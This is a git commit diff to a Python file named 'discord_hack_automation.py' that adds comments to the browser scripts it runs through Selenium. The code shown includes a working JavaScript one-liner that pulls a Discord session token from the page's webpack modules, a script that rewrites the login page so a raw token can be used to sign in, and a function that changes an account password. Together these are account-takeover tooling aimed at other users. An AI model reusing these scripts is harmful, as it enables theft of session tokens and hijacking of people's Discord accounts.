aad31e4e568b0db4e8627124325cb8a1b991fb95
FlyN-Nick <43420132+FlyN-Nick@users.noreply.github.com>
2021-12-13 14:52:52 -0800

    Added some comments to explain the js scripts.

--- discord_hack_automation.py
+++ discord_hack_automation.py
@@ -114,6 +114,7 @@ def delete(driver):
 # PRACTICALLY UNUSABLE
 def change_password(driver, old_pass, new_pass):
     # can't use this function, impossible to get their password
+    # script creates an html request to change their password
     change_password_script = '''
     let oldpassword = "''' + old_pass + '''";
     let newpassword = "''' + new_pass + '''";
@@ -122,6 +123,7 @@ def change_password(driver, old_pass, new_pass):
     driver.execute_script(change_password_script)
 
 def get_account_token(driver):
+    # script gets the token from the get token function 
     token_script = "return (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()"
     return driver.execute_script(token_script)
 
@@ -129,6 +131,7 @@ def login_with_auth_token(driver, token):
     driver.get(DISCORD_LOGIN_URL)
     sleep(0.1)
     # changes the login field to a new field that accepts the token
+    # because the default login field actually just makes a request to first generate the token, then use that token to login
     script = 'function login(e) {setInterval(() => {window.webpackChunkdiscord_app.push([[Math.random()], {}, (req) => {for (const m of Object.keys(req.c).map((x) => req.c[x].exports).filter((x) => x)) {if (m.default && m.default.setToken !== undefined) {return m.default.setToken(e)}if (m.setToken !== undefined) {return m.setToken(e)}}}]);console.log("%cWorked!", "font-size: 50px");}, 50), setTimeout(() => {window.location.reload()}, 2500)}function buttonlogin(){login(document.getElementsByClassName("inputDefault-_djjkz input-cIJ7To")[0].value)}var element;(element=document.getElementsByClassName("marginBottom8-AtZOdT button-3k0cO7 button-38aScr lookFilled-1Gx00P colorBrand-3pXr91 sizeLarge-1vSeWK fullWidth-1orjjo grow-q77ONN")[0]).addEventListener("click",buttonlogin),(element=document.getElementsByClassName("marginBottom20-32qID7")[0]).parentElement.removeChild(element),(element=document.getElementsByClassName("colorStandard-2KCXvj size14-e6ZScH h5-18_1nd title-3sZWYQ defaultMarginh5-2mL-bP")[0]).innerHTML="Token",element.id="Token",(element=document.getElementsByClassName("transitionGroup-aR7y1d qrLogin-1AOZMt")[0]).parentElement.removeChild(element),(element=document.getElementsByClassName("verticalSeparator-3huAjp")[0]).parentElement.removeChild(element);'
     driver.execute_script(script)
     sleep(0.1)
